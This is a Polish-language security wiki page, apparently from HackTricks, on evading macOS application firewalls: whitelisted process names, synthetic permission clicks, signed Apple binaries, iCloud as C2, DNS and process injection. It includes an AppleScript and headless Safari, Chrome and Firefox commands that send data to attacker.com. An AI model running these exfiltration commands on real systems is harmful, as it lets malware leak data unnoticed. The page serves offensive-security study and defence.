# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Znalezione techniki

Poniższe techniki zostały znalezione jako działające w niektórych aplikacjach zapory macOS.

### Wykorzystywanie nazw na białej liście

- Na przykład wywołując złośliwe oprogramowanie nazwami dobrze znanych procesów macOS, takich jak **`launchd`**

### Syntetyczne kliknięcie

- Jeśli zapora prosi użytkownika o pozwolenie, spraw, aby złośliwe oprogramowanie **kliknęło na zezwól**

### **Użyj podpisanych binarek Apple**

- Takich jak **`curl`**, ale także innych, jak **`whois`**

### Znane domeny Apple

Zapora może zezwalać na połączenia z dobrze znanymi domenami Apple, takimi jak **`apple.com`** lub **`icloud.com`**. A iCloud może być używany jako C2.

### Ogólny bypass

Kilka pomysłów na próbę obejścia zapór

### Sprawdź dozwolony ruch

Znajomość dozwolonego ruchu pomoże zidentyfikować potencjalnie białe listy domen lub które aplikacje mają dostęp do nich.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Wykorzystywanie DNS

Rozwiązywanie DNS odbywa się za pomocą **`mdnsreponder`** podpisanej aplikacji, która prawdopodobnie będzie miała pozwolenie na kontakt z serwerami DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Poprzez aplikacje przeglądarkowe

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Poprzez wstrzykiwanie procesów

Jeśli możesz **wstrzyknąć kod do procesu**, który ma prawo łączyć się z dowolnym serwerem, możesz obejść zabezpieczenia zapory:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Odniesienia

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
